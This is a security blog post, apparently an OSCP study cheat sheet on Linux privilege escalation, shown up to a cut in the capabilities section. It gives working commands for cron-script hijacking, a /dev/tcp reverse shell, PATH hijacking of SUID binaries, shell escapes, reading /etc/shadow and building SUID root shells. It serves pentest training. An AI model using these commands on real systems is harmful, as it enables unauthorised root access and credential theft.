<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="map[name:Quac Tran]">
<meta name="description" content="Linux-Privilege-Escalation Synthesize, supplement from a number of other resources Editing and addition: TranQuac Summary  Tools Scheduled tasks  Cron jobs Systemd timers   PATH Variables SUID  Find SUID binaries Exploitation Create a SUID binary   Capabilities  List capabilities of binaries Edit capabilities Interesting capabilities   SUDO  Allow Root Privilege to Binary commands Allow Root Privilege to Shell Script Allow Sudo Right to other Programs LD_PRELOAD Doas sudo_inject CVE-2019-14287   GTFOBins Wildcard Writable files  Writable /etc/passwd Writable /etc/sudoers   Exploiting Services  Services manual enumeration Automatic enumeration Port forwarding   NFS Root Squashing Shared Library  ldconfig RPATH   Groups  Docker LXC/LXD   Kernel Exploits  CVE-2016-5195 (DirtyCow) CVE-2010-3904 (RDS) CVE-2010-4258 (Full Nelson) CVE-2012-0056 (Mempodipper) LIST KERNEL    Tools There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors." />
<meta name="keywords" content=", oscp, infosec, linux, privilege-escalation" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://tranquac.github.io/posts/2021/03/linux-privilege-escalation/" />


    <title>
        
            Linux Privilege Escalation :: quac tran 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://tranquac.github.io/main.672db4689dc5642de5414c42e1e25cf5fadb60282ca8397433c5ee14fe43dd91.css">



    <link rel="apple-touch-icon" sizes="180x180" href="https://tranquac.github.io/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://tranquac.github.io/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://tranquac.github.io/favicon-16x16.png">
    <link rel="manifest" href="https://tranquac.github.io/site.webmanifest">
    <link rel="mask-icon" href="https://tranquac.github.io/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="https://tranquac.github.io/favicon.ico">
    <meta name="msapplication-TileColor" content="">
    <meta name="theme-color" content="">



<meta itemprop="name" content="Linux Privilege Escalation">
<meta itemprop="description" content="Linux-Privilege-Escalation Synthesize, supplement from a number of other resources Editing and addition: TranQuac Summary  Tools Scheduled tasks  Cron jobs Systemd timers   PATH Variables SUID  Find SUID binaries Exploitation Create a SUID binary   Capabilities  List capabilities of binaries Edit capabilities Interesting capabilities   SUDO  Allow Root Privilege to Binary commands Allow Root Privilege to Shell Script Allow Sudo Right to other Programs LD_PRELOAD Doas sudo_inject CVE-2019-14287   GTFOBins Wildcard Writable files  Writable /etc/passwd Writable /etc/sudoers   Exploiting Services  Services manual enumeration Automatic enumeration Port forwarding   NFS Root Squashing Shared Library  ldconfig RPATH   Groups  Docker LXC/LXD   Kernel Exploits  CVE-2016-5195 (DirtyCow) CVE-2010-3904 (RDS) CVE-2010-4258 (Full Nelson) CVE-2012-0056 (Mempodipper) LIST KERNEL    Tools There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors."><meta itemprop="datePublished" content="2021-03-18T00:00:00&#43;00:00" />
<meta itemprop="dateModified" content="2021-03-18T00:00:00&#43;00:00" />
<meta itemprop="wordCount" content="3053"><meta itemprop="image" content="https://raw.githubusercontent.com/tranquac/Blog_Image/master/avatar/Kali.png"/>
<meta itemprop="keywords" content="oscp,infosec,linux,privilege-escalation," />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://raw.githubusercontent.com/tranquac/Blog_Image/master/avatar/Kali.png"/>

<meta name="twitter:title" content="Linux Privilege Escalation"/>
<meta name="twitter:description" content="Linux-Privilege-Escalation Synthesize, supplement from a number of other resources Editing and addition: TranQuac Summary  Tools Scheduled tasks  Cron jobs Systemd timers   PATH Variables SUID  Find SUID binaries Exploitation Create a SUID binary   Capabilities  List capabilities of binaries Edit capabilities Interesting capabilities   SUDO  Allow Root Privilege to Binary commands Allow Root Privilege to Shell Script Allow Sudo Right to other Programs LD_PRELOAD Doas sudo_inject CVE-2019-14287   GTFOBins Wildcard Writable files  Writable /etc/passwd Writable /etc/sudoers   Exploiting Services  Services manual enumeration Automatic enumeration Port forwarding   NFS Root Squashing Shared Library  ldconfig RPATH   Groups  Docker LXC/LXD   Kernel Exploits  CVE-2016-5195 (DirtyCow) CVE-2010-3904 (RDS) CVE-2010-4258 (Full Nelson) CVE-2012-0056 (Mempodipper) LIST KERNEL    Tools There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors."/>




    <meta property="og:title" content="Linux Privilege Escalation" />
<meta property="og:description" content="Linux-Privilege-Escalation Synthesize, supplement from a number of other resources Editing and addition: TranQuac Summary  Tools Scheduled tasks  Cron jobs Systemd timers   PATH Variables SUID  Find SUID binaries Exploitation Create a SUID binary   Capabilities  List capabilities of binaries Edit capabilities Interesting capabilities   SUDO  Allow Root Privilege to Binary commands Allow Root Privilege to Shell Script Allow Sudo Right to other Programs LD_PRELOAD Doas sudo_inject CVE-2019-14287   GTFOBins Wildcard Writable files  Writable /etc/passwd Writable /etc/sudoers   Exploiting Services  Services manual enumeration Automatic enumeration Port forwarding   NFS Root Squashing Shared Library  ldconfig RPATH   Groups  Docker LXC/LXD   Kernel Exploits  CVE-2016-5195 (DirtyCow) CVE-2010-3904 (RDS) CVE-2010-4258 (Full Nelson) CVE-2012-0056 (Mempodipper) LIST KERNEL    Tools There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://tranquac.github.io/posts/2021/03/linux-privilege-escalation/" /><meta property="og:image" content="https://raw.githubusercontent.com/tranquac/Blog_Image/master/avatar/Kali.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-03-18T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2021-03-18T00:00:00&#43;00:00" />
<meta property="og:see_also" content="https://tranquac.github.io/posts/2021/06/linux-backdoors/" />





    <meta property="article:section" content="oscp" />

    <meta property="article:section" content="infosec" />

    <meta property="article:section" content="linux" />

    <meta property="article:section" content="privilege-escalation" />



    <meta property="article:published_time" content="2021-03-18 00:00:00 &#43;0000 UTC" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://tranquac.github.io/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text">Security ramblings</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://tranquac.github.io/about/">about</a></li><li><a href="https://tranquac.github.io/posts/">posts</a></li><li><a href="https://tranquac.github.io/write-up/">write-up</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        15 minutes

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="https://tranquac.github.io/posts/2021/03/linux-privilege-escalation/">Linux Privilege Escalation</a>
      </h1>

      

      

      

      <div class="post-content">
        <h1 id="linux-privilege-escalation">Linux-Privilege-Escalation</h1>
<h2 id="synthesize-supplement-from-a-number-of-other-resources">Synthesize, supplement from a number of other resources</h2>
<h2 id="editing-and-addition-tranquac">Editing and addition: TranQuac</h2>
<h2 id="summary">Summary</h2>
<ul>
<li><a href="#tools">Tools</a></li>
<li><a href="#scheduled-tasks">Scheduled tasks</a>
<ul>
<li><a href="#cron-jobs">Cron jobs</a></li>
<li><a href="#systemd-timers">Systemd timers</a></li>
</ul>
</li>
<li><a href="#path-variables">PATH Variables</a></li>
<li><a href="#suid">SUID</a>
<ul>
<li><a href="#find-suid-binaries">Find SUID binaries</a></li>
<li><a href="#exploitation-suid">Exploitation</a></li>
<li><a href="#create-a-suid-binary">Create a SUID binary</a></li>
</ul>
</li>
<li><a href="#capabilities">Capabilities</a>
<ul>
<li><a href="#list-capabilities-of-binaries">List capabilities of binaries</a></li>
<li><a href="#edit-capabilities">Edit capabilities</a></li>
<li><a href="#interesting-capabilities">Interesting capabilities</a></li>
</ul>
</li>
<li><a href="#sudo">SUDO</a>
<ul>
<li><a href="#allow-root-privilege-to-binary-commands">Allow Root Privilege to Binary commands</a></li>
<li><a href="#allow-root-privilege-to-shell-script">Allow Root Privilege to Shell Script</a></li>
<li><a href="#allow-sudo-right-to-other-programs">Allow Sudo Right to other Programs</a></li>
<li><a href="#ld_preload">LD_PRELOAD</a></li>
<li><a href="#doas">Doas</a></li>
<li><a href="#sudo_inject">sudo_inject</a></li>
<li><a href="#cve-2019-14287">CVE-2019-14287</a></li>
</ul>
</li>
<li><a href="#gtfobins">GTFOBins</a></li>
<li><a href="#wildcard">Wildcard</a></li>
<li><a href="#writable-files">Writable files</a>
<ul>
<li><a href="#writable-etcpasswd">Writable /etc/passwd</a></li>
<li><a href="#writable-etcsudoers">Writable /etc/sudoers</a></li>
</ul>
</li>
<li><a href="#exploiting-services">Exploiting Services</a>
<ul>
<li><a href="#services-manual-enumeration">Services manual enumeration</a></li>
<li><a href="automatic-enumeration">Automatic enumeration</a></li>
<li><a href="port-forwarding">Port forwarding</a></li>
</ul>
</li>
<li><a href="#nfs-root-squashing">NFS Root Squashing</a></li>
<li><a href="#shared-library">Shared Library</a>
<ul>
<li><a href="#ldconfig">ldconfig</a></li>
<li><a href="#rpath">RPATH</a></li>
</ul>
</li>
<li><a href="#groups">Groups</a>
<ul>
<li><a href="#docker">Docker</a></li>
<li><a href="#lxclxd">LXC/LXD</a></li>
</ul>
</li>
<li><a href="#kernel-exploits">Kernel Exploits</a>
<ul>
<li><a href="#CVE-2016-5195-dirtycow">CVE-2016-5195 (DirtyCow)</a></li>
<li><a href="#%5BCVE-2010-3904-rds">CVE-2010-3904 (RDS)</a></li>
<li><a href="#CVE-2010-4258-full-nelson">CVE-2010-4258 (Full Nelson)</a></li>
<li><a href="#CVE-2012-0056-mempodipper">CVE-2012-0056 (Mempodipper)</a></li>
<li><a href="#LIST">LIST KERNEL</a></li>
</ul>
</li>
</ul>
<h2 id="tools">Tools</h2>
<p>There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors.
Here are a few:</p>
<ul>
<li>
<p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS - Linux Privilege Escalation Awesome Script</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">wget <span style="color:#e6db74">&#34;https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh&#34;</span> -O linpeas.sh
curl <span style="color:#e6db74">&#34;https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh&#34;</span> -o linpeas.sh
./linpeas.sh -a <span style="color:#75715e">#all checks - deeper system enumeration, but it takes longer to complete.</span>
./linpeas.sh -s <span style="color:#75715e">#superfast &amp; stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.</span>
./linpeas.sh -P <span style="color:#75715e">#Password - Pass a password that will be used with sudo -l and bruteforcing other users</span>
</code></pre></div></li>
<li>
<p><a href="https://github.com/diego-treitos/linux-smart-enumeration">LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">wget <span style="color:#e6db74">&#34;https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh&#34;</span> -O lse.sh
curl <span style="color:#e6db74">&#34;https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh&#34;</span> -o lse.sh
./lse.sh -l1 <span style="color:#75715e"># shows interesting information that should help you to privesc</span>
./lse.sh -l2 <span style="color:#75715e"># dump all the information it gathers about the system</span>
</code></pre></div></li>
<li>
<p><a href="https://github.com/rebootuser/LinEnum">LinEnum - Scripted Local Linux Enumeration &amp; Privilege Escalation Checks</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
</code></pre></div></li>
<li>
<p><a href="https://github.com/AlessandroZ/BeRoot">BeRoot - Privilege Escalation Project - Windows / Linux / Mac</a></p>
</li>
<li>
<p><a href="https://github.com/sleventyeleven/linuxprivchecker">linuxprivchecker.py - a Linux Privilege Escalation Check Script</a></p>
</li>
<li>
<p><a href="https://github.com/pentestmonkey/unix-privesc-check">unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check</a></p>
</li>
<li>
<p><a href="https://github.com/TH3xACE/SUDO_KILLER">Privilege Escalation through sudo - Linux</a></p>
</li>
</ul>
<h2 id="scheduled-tasks">Scheduled tasks</h2>
<h3 id="cron-jobs">Cron jobs</h3>
<p>Check if you have access with write permission on these files.<br>
Check inside the file, to find other paths with write permissions.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$cat /etc/crontab
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
</code></pre></div><p>You can use <a href="https://github.com/DominicBreuker/pspy">pspy</a> to detect a CRON job.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># print both commands and file system events and scan procfs every 1000 ms (=1sec)</span>
./pspy64 -pf -i 1000 
</code></pre></div><p>####Cron job Bash exploit
Overwrite the Bash script with the following if you have write permissions:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash		
</span><span style="color:#75715e"></span>bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;<span style="color:#ae81ff">1</span>  <span style="color:#75715e"># amend &lt;IP&gt; and &lt;PORT&gt;</span>
</code></pre></div><p>Setup a Netcat listener and wait for the cron job to execute the script.</p>
<p>####Cron job PATH environment variable exploit
Run lse.sh and check for “Can we write to any paths present in cron jobs”.
Create the following script matching the name of the cron job in /tmp:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
</code></pre></div><p>Make sure the script is executable:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod +x &lt;CRON-SCRIPT&gt;.sh
</code></pre></div><p>Wait for the cron job to run and then execute the newly created SUID script in /tmp:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/tmp/rootbash
</code></pre></div><p>You will now have a root shell.</p>
<p>Refer: 
<a href="https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/">linux-privilege-escalation-by-exploiting-cron-jobs</a>
<a href="https://materials.rangeforce.com/tutorial/2020/04/17/Cron-Privilege-Escalation/">https://materials.rangeforce.com/tutorial/2020/04/17/Cron-Privilege-Escalation/</a></p>
<h2 id="systemd-timers">Systemd timers</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">systemctl list-timers --all
NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
Mon 2019-04-01 02<span style="color:#960050;background-color:#1e0010">:</span>59<span style="color:#960050;background-color:#1e0010">:</span>14 CEST  15h left Sun 2019-03-31 10<span style="color:#960050;background-color:#1e0010">:</span>52<span style="color:#960050;background-color:#1e0010">:</span>49 CEST  24min ago          apt-daily.timer              apt-daily.service
Mon 2019-04-01 06<span style="color:#960050;background-color:#1e0010">:</span>20<span style="color:#960050;background-color:#1e0010">:</span>40 CEST  19h left Sun 2019-03-31 10<span style="color:#960050;background-color:#1e0010">:</span>52<span style="color:#960050;background-color:#1e0010">:</span>49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2019-04-01 07<span style="color:#960050;background-color:#1e0010">:</span>36<span style="color:#960050;background-color:#1e0010">:</span>10 CEST  20h left Sat 2019-03-09 14<span style="color:#960050;background-color:#1e0010">:</span>28<span style="color:#960050;background-color:#1e0010">:</span>25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

3 timers listed.
</code></pre></div><h2 id="path-variables">PATH Variables</h2>
<p>First, search for the file having SUID or 4000 permission with help of Find command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
<span style="color:#75715e">#home/quac/script/shell</span>
</code></pre></div><h3 id="if-executing-ps-in-the-shell-example">If executing <code>ps</code> in the shell, Example:</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#include &lt;unistd.h&gt;</span>
void main<span style="color:#f92672">(){</span>
	setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
	setgid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
	system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ps&#34;</span><span style="color:#f92672">)</span>;
<span style="color:#f92672">}</span>
</code></pre></div><p>Then:
<code>Method 1:</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$cd /tmp
$echo <span style="color:#e6db74">&#34;/bin/bash&#34;</span> &gt; ps
$chmod <span style="color:#ae81ff">777</span> ps
$echo $PATH
$export PATH<span style="color:#f92672">=</span>/tmp:$PATH
$cd /home/raj/script
$./shell
$whoami
<span style="color:#75715e">#root</span>
</code></pre></div><p><code>Method 2:</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cd /home/quac/script/
cp /bin/sh /tmp/ps
echo $PATH
export PATH<span style="color:#f92672">=</span>/tmp:$PATH
./shell
whoami
</code></pre></div><h3 id="if-executing-id-in-the-shell-example">If executing <code>id</code> in the shell, Example:</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#include &lt;unistd.h&gt;</span>
void main<span style="color:#f92672">(){</span>
	setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
	setgid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
	system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;id&#34;</span><span style="color:#f92672">)</span>;
<span style="color:#f92672">}</span>
</code></pre></div><p>Then:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$cd /tmp
$echo <span style="color:#e6db74">&#34;/bin/bash&#34;</span> &gt; id
$chmod <span style="color:#ae81ff">777</span> id
$echo $PATH
$export PATH<span style="color:#f92672">=</span>/tmp:$PATH
$cd /home/quac/script
$./shell
$whoami
</code></pre></div><h3 id="if-executing-cat-in-the-shell-example">If executing <code>cat</code> in the shell, Example:</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#include &lt;unistd.h&gt;</span>
void main<span style="color:#f92672">(){</span>
	setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
	setgid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
	system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;cat /etc/passwd&#34;</span><span style="color:#f92672">)</span>;
<span style="color:#f92672">}</span>
</code></pre></div><p>Then:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$cd /tmp
$nano cat
/bin/bash
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$chmod <span style="color:#ae81ff">777</span> cat
$ls -al cat
$echo $PATH
$export PATH<span style="color:#f92672">=</span>/tmp:$PATH
$cd /home/quac/script
$./shell
$whoami
</code></pre></div><p>Refer: <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></p>
<h2 id="suid">SUID</h2>
<h3 id="find-suid-binaries">Find SUID binaries</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find / -perm -4000 -type f -exec ls -la <span style="color:#f92672">{}</span> 2&gt;/dev/null <span style="color:#ae81ff">\;</span>
find / -uid <span style="color:#ae81ff">0</span> -perm -4000 -type f 2&gt;/dev/null
</code></pre></div><h3 id="exploitation-suid">Exploitation SUID</h3>
<p>Cp</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$cp /etc/passwd /var/www/html
<span style="color:#75715e">#Change pass or add new user to /var/www/html</span>
<span style="color:#75715e">#(python3 -&gt; import crypt -&gt; crypt.crypt(‘newpass’))</span>
$python -m http.server <span style="color:#ae81ff">80</span>
$cd /tmp
$wget //$IP/passwd
$cp passwd /etc/passwd
</code></pre></div><p>Nmap</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap --interactive
nmap&gt; !sh
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#Another way below (if nmap doesn’t have interactive mode):</span>
$ echo “os.execute<span style="color:#f92672">(</span>‘/bin/sh’<span style="color:#f92672">)</span>” &gt; /tmp/shell.nse
$ sudo nmap --script<span style="color:#f92672">=</span>/tmp/shell.nse
</code></pre></div><p>Vi</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ vi
:!sh
</code></pre></div><p>Find</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ find / home -exec sh -i <span style="color:#ae81ff">\;</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#Or exec any command:</span>
$touch file
$find file -exec <span style="color:#e6db74">&#34;whoami&#34;</span> <span style="color:#ae81ff">\;</span>
</code></pre></div><p>Python</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python -c ‘import pty;pty.spawn<span style="color:#f92672">(</span>“/bin/sh”<span style="color:#f92672">)</span>’
</code></pre></div><p>Strace</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ strace -o /dev/null /bin/sh
</code></pre></div><p>Tcpdump</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo $’id<span style="color:#ae81ff">\n</span>cat /etc/shadow’ &gt; /tmp/.shell
$ chmod +x /tmp/.shell
$ tcpdump -ln -i eth0 -w /dev/null -W <span style="color:#ae81ff">1</span> -G <span style="color:#ae81ff">1</span> -z /tmp/.shell -Z root
</code></pre></div><h3 id="create-a-suid-binary">Create a SUID binary</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$print <span style="color:#e6db74">&#39;int main(void){\nsetresuid(0, 0, 0);\nsystem(&#34;/bin/sh&#34;);\n}&#39;</span> &gt; /tmp/suid.c   
$gcc -o /tmp/suid /tmp/suid.c  
$sudo chmod +x /tmp/suid <span style="color:#75715e"># execute right</span>
$sudo chmod +s /tmp/suid <span style="color:#75715e"># setuid bit</span>
</code></pre></div><h2 id="capabilities">Capabilities</h2>
<h3 id="list-capabilities-of-binaries">List capabilities of binaries</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">getcap -r / 2&gt;/dev/null
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ /usr/bin/getcap -r  /usr/bin
/usr/bin/fping                <span style="color:#f92672">=</span> cap_net_raw+ep
/usr/bin/dumpcap              <span style="color:#f92672">=</span> cap_dac_override,cap_net_admin,cap_net_raw+eip
/usr/bin/gnome-keyring-daemon <span style="color:#f92672">=</span> cap_ipc_lock+ep
/usr/bin/rlogin               <span style="color:#f92672">=</span> cap_net_bind_service+ep
/usr/bin/ping                 <span style="color:#f92672">=</span> cap_net_raw+ep
/usr/bin/rsh                  <span style="color:#f92672">=</span> cap_net_bind_service+ep
/usr/bin/rcp                  <span style="color:#f92672">=</span> cap_net_bind_service+ep
</code></pre></div><h3 id="edit-capabilities">Edit capabilities</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">/usr/bin/setcap -r /bin/ping            <span style="color:#75715e"># remove</span>
/usr/bin/setcap cap_net_raw+p /bin/ping <span style="color:#75715e"># add</span>
</code></pre></div><h3 id="interesting-capabilities">Interesting capabilities</h3>
<p>Having the capability =ep means the binary has all the capabilities.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$ getcap openssl /usr/bin/openssl 
openssl=ep
</code></pre></div><p>Alternatively the following capabilities can be used in order to upgrade your current privileges.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">cap_dac_read_search <span style="color:#75715e"># read anything</span>
cap_setuid+ep <span style="color:#75715e"># setuid</span>
</code></pre></div><p>Privilege escalation with <code>cap_setuid+ep</code> and <code>python</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python3

